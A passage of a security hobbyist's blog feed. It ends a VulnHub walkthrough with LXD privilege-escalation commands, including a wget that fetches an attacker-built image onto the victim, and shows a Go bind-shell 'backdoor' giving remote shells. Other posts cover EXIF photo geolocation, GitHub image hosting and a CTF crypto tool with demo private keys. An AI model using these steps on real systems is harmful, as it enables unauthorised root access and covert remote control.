class="string">02d6267ed96e6b615b031dafe9607151</span></span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub274.jpg"></li>
</ul>
<h3 id="lxd-privilege-escalation"><a href="#lxd-privilege-escalation" class="headerlink" title="lxd privilege escalation"></a>lxd privilege escalation</h3><p>reference to the following article</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuaGFja2luZ2FydGljbGVzLmluL2x4ZC1wcml2aWxlZ2UtZXNjYWxhdGlvbi8=">lxd privilege escalation<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>use the following commands to build the lxd image for later useage</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/saghul/lxd-alpine-builder.git</span><br><span class="line"><span class="built_in">cd</span> lxd-alpine-builder</span><br><span class="line">./build-alpine</span><br></pre></td></tr></table></figure>

<p>transfer alpine-v3.11-x86_64-20200119_0151.tar.gz to victim’s machine</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/lxd-alpine-builder<span class="comment"># python -m SimpleHTTPServer 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line">192.168.56.125 - - [21/May/2020 00:51:58] <span class="string">&quot;GET /alpine-v3.11-x86_64-20200119_0151.tar.gz HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ford@blume:/tmp$ wget http://192.168.56.126/alpine-v3.11-x86_64-20200119_0151.tar.gz</span><br><span class="line">--2020-05-21 10:21:57--  http://192.168.56.126/alpine-v3.11-x86_64-20200119_0151.tar.gz</span><br><span class="line">Connecting to 192.168.56.126:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3226602 (3.1M) [application/gzip]</span><br><span class="line">Saving to: ‘alpine-v3.11-x86_64-20200119_0151.tar.gz’</span><br><span class="line"></span><br><span class="line">alpine-v3.11-x86_64-20200 100%[==================================&gt;]   3.08M  --.-KB/s    <span class="keyword">in</span> 0.06s   </span><br><span class="line"></span><br><span class="line">2020-05-21 10:21:57 (50.3 MB/s) - ‘alpine-v3.11-x86_64-20200119_0151.tar.gz’ saved [3226602/3226602]</span><br></pre></td></tr></table></figure>

<p>then added as an image to LXD as follows:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ford@blume:/tmp$ lxc image import ./alpine-v3.11-x86_64-20200119_0151.tar.gz --<span class="built_in">alias</span> myimage</span><br><span class="line">Image imported with fingerprint: 468c747448ec99c6b76e5a943df89a21489eb5d605ebe5d4c341a78ec217a223</span><br></pre></td></tr></table></figure>

<p>Use the list command to check the list of images</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ford@blume:/tmp$ lxc image list</span><br><span class="line">+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+</span><br><span class="line">|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |</span><br><span class="line">+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+</span><br><span class="line">| myimage | 468c747448ec | no     | alpine v3.11 (20200119_01:51) | x86_64 | 3.08MB | May 21, 2020 at 5:39am (UTC) |</span><br><span class="line">+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+</span><br><span class="line">ford@blume:/tmp$ lxc init myimage ignite -c security.privileged=<span class="literal">true</span></span><br><span class="line">Creating ignite</span><br><span class="line">ford@blume:/tmp$ lxc config device add ignite mydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line">Device mydevice added to ignite</span><br><span class="line">ford@blume:/tmp$ lxc start ignite</span><br><span class="line">ford@blume:/tmp$ lxc <span class="built_in">exec</span> ignite /bin/sh</span><br><span class="line">~ <span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root)</span><br><span class="line">~ <span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>Once inside the container, navigate to /mnt/root to see all resources from the host machine.</p>
<p>After running the bash file. We see that we have a different shell, it is the shell of the container. This container has all the files of the host machine. So, we enumerated for the root flag and found it.</p>
<p>and finally find the root.txt at last</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~ <span class="comment"># cd /mnt/root/root</span></span><br><span class="line">/mnt/root/root <span class="comment"># ls</span></span><br><span class="line">root.txt</span><br><span class="line">/mnt/root/root <span class="comment"># cat root.txt</span></span><br><span class="line">Oh Yeah! Finally Pwned!</span><br><span class="line"></span><br><span class="line">Here<span class="string">&#x27;s your root flag:</span></span><br><span class="line"><span class="string">b0f971eddce7bd007e9f50ca02f5fe11</span></span><br><span class="line"><span class="string">    ____   __                      __    _  __ ______</span></span><br><span class="line"><span class="string">   /  _/  / /____  _   __ ___     / /   | |/ // ____/</span></span><br><span class="line"><span class="string">   / /   / // __ \| | / // _ \   / /    |   // /     </span></span><br><span class="line"><span class="string"> _/ /   / // /_/ /| |/ //  __/  / /___ /   |/ /___   </span></span><br><span class="line"><span class="string">/___/  /_/ \____/ |___/ \___/  /_____//_/|_|\____/   </span></span><br><span class="line"><span class="string">                                                     </span></span><br><span class="line"><span class="string">https://www.linkedin.com/in/sumit-verma-125576129/</span></span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub275.jpg"></li>
</ul>
<h4 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h4><ul>
<li>change the opacity 0:0 to 1:0 to show the form</li>
<li>use LFI to read /etc/passwd and ssh key</li>
<li>lxd privilege escalation</li>
</ul>
<h4 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h4><ul>
<li>QQ: 1185151867</li>
<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p><font color="blue">I’m lucifer11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>获取手机拍摄照片的经纬度及详细位置的python脚本</title>
    <url>/2019/11/11/get-pic-location/</url>
    <content><![CDATA[<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>本脚本的源码是xingag大佬的，本人只是稍作了改动，及添加了一些说明方式，使得脚本能够应用于更多场合。</p>
<p><font color="blue"><strong><em><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3hpbmdhZy8=">xingag大佬的github<i class="fa fa-external-link-alt"></i></span></em></strong></font></p>
<p><font color="red"><strong><em><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci8=">本人的github<i class="fa fa-external-link-alt"></i></span></em></strong></font></p>
<a id="more"></a>

<h3 id="脚本使用说明"><a href="#脚本使用说明" class="headerlink" title="脚本使用说明"></a>脚本使用说明</h3><ul>
<li>1.先从高德开放平台上注册后再申请一个key，如下图所示。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/location.jpg"></p>
<ul>
<li>2.如下几图所示修改main.py的源代码,使其对应正确的key和要分析的图片地址。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/location2.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/location3.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/location4.jpg"></p>
<ul>
<li>3.运行代码前，先执行下面的代码安装exifread库。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install exifread</span><br></pre></td></tr></table></figure>
<p>该库是识别图片元数据的库，使用 exifread 库可以直接读取图片文件，获取到图片的元数据，包含经度、纬度、南北纬方向、东西经方向和拍摄时间。</p>
<ul>
<li>4.运行代码时，main.py和position_utils.py必须放在同一目录下。</li>
</ul>
<p>因为通过 GPS 获取的经度、纬度和高德地图的坐标存在一定的误差，这里需要用position_utils.py脚本把坐标转换为「火星坐标系」。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/location5.jpg"></p>
<h2 id="最后附上一张效果图"><a href="#最后附上一张效果图" class="headerlink" title="最后附上一张效果图"></a>最后附上一张效果图</h2><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/location6.jpg"></p>
<h3 id="牛批哄哄的有没有"><a href="#牛批哄哄的有没有" class="headerlink" title="牛批哄哄的有没有?"></a><strong><em><font color="red">牛批哄哄的有没有?</font></em></strong></h3>]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python脚本</tag>
        <tag>照片位置信息</tag>
      </tags>
  </entry>
  <entry>
    <title>将图片上传到github图床</title>
    <url>/2018/12/08/github-imagebed/</url>
    <content><![CDATA[<ol>
<li><strong><em>新建一个repositories</em></strong></li>
</ol>
<p><img src="/images/imagebed1.jpg"></p>
<ol start="2">
<li><strong><em>进入repositories下的wiki选项中</em></strong></li>
</ol>
<p><img src="/images/imagebed2.jpg"></p>
<ol start="3">
<li><strong><em>复制wiki对应的克隆地</em></strong></li>
</ol>
<p><img src="/images/imagebed3.jpg"></p>
<a id="more"></a>

<ol start="4">
<li><strong><em>在本地克隆项目</em></strong></li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/FDlucifer/FDlucifer.github.io.wiki.git</span><br></pre></td></tr></table></figure>

<ol start="5">
<li><strong><em>进入文件夹，将要上传的图片放在文件夹中</em></strong></li>
</ol>
<p><img src="/images/imagebed4.jpg"></p>
<ol start="6">
<li><strong><em>打开命令行，依次输入命令：</em></strong></li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git add 彼岸花.jpg</span><br><span class="line"></span><br><span class="line">git commit -a -m <span class="string">&quot;update&quot;</span></span><br><span class="line"></span><br><span class="line">git push </span><br></pre></td></tr></table></figure>

<ol start="7">
<li><strong><em>现在已经将图片放置Github图床</em></strong></li>
</ol>
<p><strong>图片的地址</strong> <img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/%E5%BD%BC%E5%B2%B8%E8%8A%B1.jpg" alt="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/彼岸花.jpg"></p>
]]></content>
      <categories>
        <category>网站前端样式</category>
      </categories>
      <tags>
        <tag>github imagebed</tag>
      </tags>
  </entry>
  <entry>
    <title>gobindshell-Golang-Tcp-Bind-Shell</title>
    <url>/2020/04/11/gobindshell/</url>
    <content><![CDATA[<h4 id="Golang-Tcp-Bind-Shell"><a href="#Golang-Tcp-Bind-Shell" class="headerlink" title="Golang Tcp Bind Shell"></a>Golang Tcp Bind Shell</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">------------------------------------------------</span><br><span class="line">A golang based tcp <span class="built_in">bind</span> shell</span><br><span class="line">------------------------------------------------</span><br><span class="line"> ____          _               _  __           _ _</span><br><span class="line">| __ ) _   _  | |   _   _  ___(_)/ _| ___ _ __/ / |</span><br><span class="line">|  _ \| | | | | |  | | | |/ __| | |_ / _ \ <span class="string">&#x27;__| | |</span></span><br><span class="line"><span class="string">| |_) | |_| | | |__| |_| | (__| |  _|  __/ |  | | |</span></span><br><span class="line"><span class="string">|____/ \__, | |_____\__,_|\___|_|_|  \___|_|  |_|_|</span></span><br><span class="line"><span class="string">       |___/</span></span><br><span class="line"><span class="string">My QQ:1185151867</span></span><br><span class="line"><span class="string">Blog: https://fdlucifer.github.io/</span></span><br><span class="line"><span class="string">################################################</span></span><br></pre></td></tr></table></figure>

<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9nb2JpbmRzaGVsbA==">Download gobindshell from my github<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><p>将源代码编译好，如果目标系统是windows就在windows下的go环境中编译，目标系统是linux的话同理，将编译生成的可执行文件放到目标系统的终端里运行</p>
<ul>
<li>目标系统的环境为windows</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 172.20.10.5 5211</span></span><br><span class="line">                        welcome to lucifer11(QQ:1185151867)<span class="string">&#x27;s backdoor[default port:5211]</span></span><br><span class="line"><span class="string">[+] Connect backdoor success,press enter to join the shell :):</span></span><br><span class="line"><span class="string">Microsoft Windows [�汾 10.0.18363.752]</span></span><br><span class="line"><span class="string">(c) 2019 Microsoft Corporation����������Ȩ����</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">D:\Go\testgofiles\oldboygo\goprogram\gobackdoor&gt;whoami</span></span><br><span class="line"><span class="string">whoami</span></span><br><span class="line"><span class="string">lucifer11\hasee</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">D:\Go\testgofiles\oldboygo\goprogram\gobackdoor&gt;net user</span></span><br><span class="line"><span class="string">net user</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\\LUCIFER11 ���û��ʻ�</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">Administrator            ASPNET                   DefaultAccount           </span></span><br><span class="line"><span class="string">Guest                    HASEE                    WDAGUtilityAccount       </span></span><br><span class="line"><span class="string">�����ɹ����ɡ�</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">D:\Go\testgofiles\oldboygo\goprogram\gobackdoor&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p><img src="https://raw.githubusercontent.com/FDlucifer/gobindshell/master/showpics/1.jpg"></p>
</li>
<li><p>目标系统为linux</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 192.168.66.6 5211</span></span><br><span class="line">                        twelcome to lucifer11(QQ:1185151867)<span class="string">&#x27;s backdoor[default port:5211]                                 </span></span><br><span class="line"><span class="string">[+] Connect backdoor success,press enter to join the shell :):                                                             </span></span><br><span class="line"><span class="string">id                                                                                                                         </span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) 组=0(root)                                                                                         </span></span><br><span class="line"><span class="string">whoami                                                                                                                     </span></span><br><span class="line"><span class="string">root                                                                                                                       </span></span><br><span class="line"><span class="string">pwd                                                                                                                        </span></span><br><span class="line"><span class="string">/root</span></span><br><span class="line"><span class="string">uname -a</span></span><br><span class="line"><span class="string">Linux kali 5.4.0-kali4-amd64 #1 SMP Debian 5.4.19-1kali1 (2020-02-17) x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/FDlucifer/gobindshell/master/showpics/2.jpg"></li>
</ul>
<h3 id="优点特色"><a href="#优点特色" class="headerlink" title="优点特色"></a>优点特色</h3><ul>
<li>轻量级的golang tcp bind shell</li>
<li>同时支持windows和linux环境</li>
<li>能多平台交叉编译使用</li>
</ul>
<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ul>
<li>有任何问题请联系qq:1185151867 :)</li>
</ul>
<p>:) enjoy it ! :)</p>
]]></content>
      <categories>
        <category>golang</category>
      </categories>
      <tags>
        <tag>golang</tag>
        <tag>penetration tools</tag>
      </tags>
  </entry>
  <entry>
    <title>goendecoder-golang-ctf加解密工具-支持多达65种加密解密方法-可根据实际需要修改源码以解密密文</title>
    <url>/2020/03/25/goendecoder/</url>
    <content><![CDATA[<p><font color="green">很长一段时间没有发vulnhub靶机的博客了，因为在闭关修炼golang语言，所以废话不多说，下面是这段时间的成果，由本菜独立开发，勿喷!!! :)</font></p>
<h4 id="Golang-CTF加解密工具"><a href="#Golang-CTF加解密工具" class="headerlink" title="Golang CTF加解密工具"></a>Golang CTF加解密工具</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">----------------------------------------------------------</span><br><span class="line"> ____          _               _  __           _ _</span><br><span class="line">| __ ) _   _  | |   _   _  ___(_)/ _| ___ _ __/ / |</span><br><span class="line">|  _ \| | | | | |  | | | |/ __| | |_ / _ \ <span class="string">&#x27;__| | |</span></span><br><span class="line"><span class="string">| |_) | |_| | | |__| |_| | (__| |  _|  __/ |  | | |</span></span><br><span class="line"><span class="string">|____/ \__, | |_____\__,_|\___|_|_|  \___|_|  |_|_|</span></span><br><span class="line"><span class="string">       |___/</span></span><br><span class="line"><span class="string">----------------------------------------------------------</span></span><br><span class="line"><span class="string">QQ 1185151867</span></span><br><span class="line"><span class="string">--############################ :)hack all asshole things:)</span></span><br><span class="line"><span class="string">----------------------------------------------------------</span></span><br></pre></td></tr></table></figure>

<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9nb2VuZGVjb2Rlcg==">Download<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="Example-Pics"><a href="#Example-Pics" class="headerlink" title="Example Pics"></a>Example Pics</h3><p><img src="https://raw.githubusercontent.com/FDlucifer/goendecoder/master/showpics/show.jpg"></p>
<p><img src="https://raw.githubusercontent.com/FDlucifer/goendecoder/master/showpics/show1.jpg"></p>
<a id="more"></a>

<h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">----------------------------------------------------------</span><br><span class="line">[+] please choose your choice to encode or decode strings:</span><br><span class="line">[+] usage: [your string to convert + choice number]</span><br><span class="line">[+] list of choices:</span><br><span class="line">----------------------------------------------------------</span><br></pre></td></tr></table></figure>

<h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><h2 id="En-Dedode-a-string-without-spaces-using-ECC-Encryption"><a href="#En-Dedode-a-string-without-spaces-using-ECC-Encryption" class="headerlink" title="En/Dedode a string without spaces using ECC Encryption"></a>En/Dedode a string without spaces using ECC Encryption</h2><ul>
<li>first generate ecc public and private key</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">n casdc 9999</span><br><span class="line">- you choose [n]</span><br><span class="line">- &#123;your string [casdc], your choice [9999]&#125;</span><br><span class="line">-- Generating ECC public and private keys......</span><br><span class="line">-- generat ECC public and private key successful......</span><br><span class="line">-- your ECC public key is:</span><br><span class="line"> [-----BEGIN  WUMAN ECC PUBLIC KEY -----</span><br><span class="line">MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEKKcMkz7SfPBUXpsDMdkFaZnYnQJX</span><br><span class="line">QCCF5p90uwIaxXxmJw6aAwIrsNvp/7oPDM2YfD0efFhHB4lbKsdR5WsV0Q==</span><br><span class="line">-----END  WUMAN ECC PUBLIC KEY -----</span><br><span class="line">]</span><br><span class="line">------------------------------------------------------</span><br><span class="line">-- your ECC private key is:</span><br><span class="line"> [-----BEGIN  WUMAN ECC PRIVATE KEY -----</span><br><span class="line">MHcCAQEEIH4OwCsvWhJGfSa6jestEaEEW/92rynOKvkq6t8glExooAoGCCqGSM49</span><br><span class="line">AwEHoUQDQgAEKKcMkz7SfPBUXpsDMdkFaZnYnQJXQCCF5p90uwIaxXxmJw6aAwIr</span><br><span class="line">sNvp/7oPDM2YfD0efFhHB4lbKsdR5WsV0Q==</span><br><span class="line">-----END  WUMAN ECC PRIVATE KEY -----</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<ul>
<li>then input your string to encode</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">n 我草泥马 38</span><br><span class="line">- you choose [n]</span><br><span class="line">- &#123;your string [我草泥马], your choice [38]&#125;</span><br><span class="line">-- Reading eccpublic key from eccpublic.pem...</span><br><span class="line">-- eccpublic key:</span><br><span class="line"> [-----BEGIN  WUMAN ECC PUBLIC KEY -----</span><br><span class="line">MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEKKcMkz7SfPBUXpsDMdkFaZnYnQJX</span><br><span class="line">QCCF5p90uwIaxXxmJw6aAwIrsNvp/7oPDM2YfD0efFhHB4lbKsdR5WsV0Q==</span><br><span class="line">-----END  WUMAN ECC PUBLIC KEY -----</span><br><span class="line">]</span><br><span class="line">[+] Beginning ECC Encryption......</span><br><span class="line">- start writing ECC encrypted data to ecc-encrypted.txt...</span><br><span class="line">- convert plaintext [我草泥马] to ECC hex encryption result [046210648396eadeec655a5e9e72f15ad49f140df0f04a825b499b902f471997b3b5f95b407d006441483bd2caf9717bb8a985457ffd08e59cb5ff65a68402a807b5c959953ac3c1ea17127a9aae06dddbb540cc43218ca6b100e15c3631d1e7155728b5171c1235bd6abe676732aa03268976e657a9a16e3a26678891]</span><br><span class="line">-----------------ecc encryption over-----------------</span><br></pre></td></tr></table></figure>

<ul>
<li>then decode the encrypted text to plaintext</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">n casd 39</span><br><span class="line">- you choose [n]</span><br><span class="line">- &#123;your string [casd], your choice [39]&#125;</span><br><span class="line">-- Reading eccprivate key from eccprivate.pem...</span><br><span class="line">-- eccprivate key:</span><br><span class="line"> [-----BEGIN  WUMAN ECC PRIVATE KEY -----</span><br><span class="line">MHcCAQEEIH4OwCsvWhJGfSa6jestEaEEW/92rynOKvkq6t8glExooAoGCCqGSM49</span><br><span class="line">AwEHoUQDQgAEKKcMkz7SfPBUXpsDMdkFaZnYnQJXQCCF5p90uwIaxXxmJw6aAwIr</span><br><span class="line">sNvp/7oPDM2YfD0efFhHB4lbKsdR5WsV0Q==</span><br><span class="line">-----END  WUMAN ECC PRIVATE KEY -----</span><br><span class="line">]</span><br><span class="line">[+] Beginning ECC Decryption......</span><br><span class="line">[+] Reading byte ecc encrypted data from ecc-encrypted.txt...</span><br><span class="line">- convert ecc encrypted byte data from ecc-encrypted.txt to plaintext: [我草泥马]</span><br><span class="line">-----------------ecc decryption over-----------------</span><br></pre></td></tr></table></figure>

<h2 id="En-Dedode-a-string-with-spaces-include-using-ECC-Encryption"><a href="#En-Dedode-a-string-with-spaces-include-using-ECC-Encryption" class="headerlink" title="En/Dedode a string with spaces include using ECC Encryption"></a>En/Dedode a string with spaces include using ECC Encryption</h2><ul>
<li>first generate ecc public and private key</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">n casdc 9999</span><br><span class="line">- you choose [n]</span><br><span class="line">- &#123;your string [casdc], your choice [9999]&#125;</span><br><span class="line">-- Generating ECC public and private keys......</span><br><span class="line">-- generat ECC public and private key successful......</span><br><span class="line">-- your ECC public key is:</span><br><span class="line"> [-----BEGIN  WUMAN ECC PUBLIC KEY -----</span><br><span class="line">MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEKKcMkz7SfPBUXpsDMdkFaZnYnQJX</span><br><span class="line">QCCF5p90uwIaxXxmJw6aAwIrsNvp/7oPDM2YfD0efFhHB4lbKsdR5WsV0Q==</span><br><span class="line">-----END  WUMAN ECC PUBLIC KEY -----</span><br><span class="line">]</span><br><span class="line">------------------------------------------------------</span><br><span class="line">-- your ECC private key is:</span><br><span class="line"> [-----BEGIN  WUMAN ECC PRIVATE KEY -----</span><br><span class="line">MHcCAQEEIH4OwCsvWhJGfSa6jestEaEEW/92rynOKvkq6t8glExooAoGCCqGSM49</span><br><span class="line">AwEHoUQDQgAEKKcMkz7SfPBUXpsDMdkFaZnYnQJXQCCF5p90uwIaxXxmJw6aAwIr</span><br><span class="line">sNvp/7oPDM2YfD0efFhHB4lbKsdR5WsV0Q==</span><br><span class="line">-----END  WUMAN ECC PRIVATE KEY -----</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<ul>
<li>then input your string to encode</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">y 我 操 你 妈妈</span><br><span class="line">- you choose [y]</span><br><span class="line">- &#123;your string [我 操 你 妈妈</span><br><span class="line">]&#125;</span><br><span class="line">38</span><br><span class="line">- &#123;your choice [38]&#125;</span><br><span class="line">-- Reading eccpublic key from eccpublic.pem...</span><br><span class="line">-- eccpublic key:</span><br><span class="line"> [-----BEGIN  WUMAN ECC PUBLIC KEY -----</span><br><span class="line">MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEKKcMkz7SfPBUXpsDMdkFaZnYnQJX</span><br><span class="line">QCCF5p90uwIaxXxmJw6aAwIrsNvp/7oPDM2YfD0efFhHB4lbKsdR5WsV0Q==</span><br><span class="line">-----END  WUMAN ECC PUBLIC KEY -----</span><br><span class="line">]</span><br><span class="line">[+] Beginning ECC Encryption......</span><br><span class="line">- start writing ECC encrypted data to ecc-encrypted.txt...</span><br><span class="line">- convert plaintext [我 操 你 妈妈</span><br><span class="line">] to ECC hex encryption result [0499173f0b7246278597bb1268ba64da228b6e447ea184dfa8c14277fff6c7da170cd24acf341ae2856137c90c00b495573484dd0bc133aae1a5540a17fcda9dd37b47d037f1410acc6b4ebcaa47ae18fd1b23bcc47cce5fa27b8746a1143908b9bab8cdea55d76ffc9f82e88ef2345240f7d10dde9962967bd6077c3e7f8023eb9e06b658]</span><br><span class="line">-----------------ecc encryption over-----------------</span><br></pre></td></tr></table></figure>

<ul>
<li>then decode the encrypted text to plaintext</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">y casd</span><br><span class="line">- you choose [y]</span><br><span class="line">- &#123;your string [casd</span><br><span class="line">]&#125;</span><br><span class="line">39</span><br><span class="line">- &#123;your choice [39]&#125;</span><br><span class="line">-- Reading eccprivate key from eccprivate.pem...</span><br><span class="line">-- eccprivate key:</span><br><span class="line"> [-----BEGIN  WUMAN ECC PRIVATE KEY -----</span><br><span class="line">MHcCAQEEIH4OwCsvWhJGfSa6jestEaEEW/92rynOKvkq6t8glExooAoGCCqGSM49</span><br><span class="line">AwEHoUQDQgAEKKcMkz7SfPBUXpsDMdkFaZnYnQJXQCCF5p90uwIaxXxmJw6aAwIr</span><br><span class="line">sNvp/7oPDM2YfD0efFhHB4lbKsdR5WsV0Q==</span><br><span class="line">-----END  WUMAN ECC PRIVATE KEY -----</span><br><span class="line">]</span><br><span class="line">[+] Beginning ECC Decryption......</span><br><span class="line">[+] Reading byte ecc encrypted data from ecc-encrypted.txt...</span><br><span class="line">- convert ecc encrypted byte data from ecc-encrypted.txt to plaintext: [我 操 你 妈妈</span><br><span class="line">]</span><br><span class="line">-----------------ecc decryption over-----------------</span><br></pre></td></tr></table></figure>

<ul>
<li>other en/decryption method are just like this</li>
</ul>
<h4 id="Support-Encryption-and-decryption-algorithm"><a href="#Support-Encryption-and-decryption-algorithm" class="headerlink" title="Support Encryption and decryption algorithm"></a>Support Encryption and decryption algorithm</h4><ul>
<li><ol>
<li>base64 encode</li>
</ol>
</li>
<li><ol start="2">
<li>base64 decode</li>
</ol>
</li>
<li><ol start="3">
<li>Aes cbc model encode</li>
</ol>
</li>
<li><ol start="4">
<li>Aes cbc model decode</li>
</ol>
</li>
<li><ol start="5">
<li>Aes ecb model encode</li>
</ol>
</li>
<li><ol start="6">
<li>Aes ecb model decode</li>
</ol>
</li>
<li><ol start="7">
<li>Aes cfb model encode</li>
</ol>
</li>
<li><ol start="8">
<li>Aes cfb model decode</li>
</ol>
</li>
<li><ol start="9">
<li>hex encode (ASCII hex)</li>
</ol>
</li>
<li><ol start="10">
<li>hex decode (ASCII hex)</li>
</ol>
</li>
<li><ol start="11">
<li>md5 encode (md5($pass.$salt);Joomia)</li>
</ol>
</li>
<li><ol start="12">
<li>sha1 encode</li>
</ol>
</li>
<li><ol start="13">
<li>hmac encode (md5)</li>
</ol>
</li>
<li><ol start="14">
<li>sha256 encode</li>
</ol>
</li>
<li><ol start="15">
<li>hmac-sha1 encode</li>
</ol>
</li>
<li><ol start="17">
<li>hmac-sha512 encode</li>
</ol>
</li>
<li><ol start="18">
<li>Base64Url Safe encode &lt;not contain (‘/‘,’+’);replaced by (‘_’,’-‘);(‘=’) removed&gt;</li>
</ol>
</li>
<li><ol start="19">
<li>Base64Url Safe decode</li>
</ol>
</li>
<li><ol start="20">
<li>des Ecb encryption</li>
</ol>
</li>
<li><ol start="21">
<li>des Ecb decryption</li>
</ol>
</li>
<li><ol start="22">
<li>des Cbc encryption</li>
</ol>
</li>
<li><ol start="23">
<li>des Cbc decryption</li>
</ol>
</li>
<li><ol start="24">
<li>3des Cbc encryption</li>
</ol>
</li>
<li><ol start="25">
<li>3des Cbc decryption</li>
</ol>
</li>
<li><ol start="26">
<li>Ripemd160 encryption</li>
</ol>
</li>
<li><ol start="27">
<li>3des Ecb encryption</li>
</ol>
</li>
<li><ol start="28">
<li>3des Ecb decryption</li>
</ol>
</li>
<li><ol start="29">
<li>Rc4 encryption</li>
</ol>
</li>
<li><ol start="30">
<li>AzDG encryption</li>
</ol>
</li>
<li><ol start="31">
<li>AzDG decryption</li>
</ol>
</li>
<li><ol start="32">
<li>Aes CTR encryption</li>
</ol>
</li>
<li><ol start="33">
<li>Aes CTR decryption</li>
</ol>
</li>
<li><ol start="34">
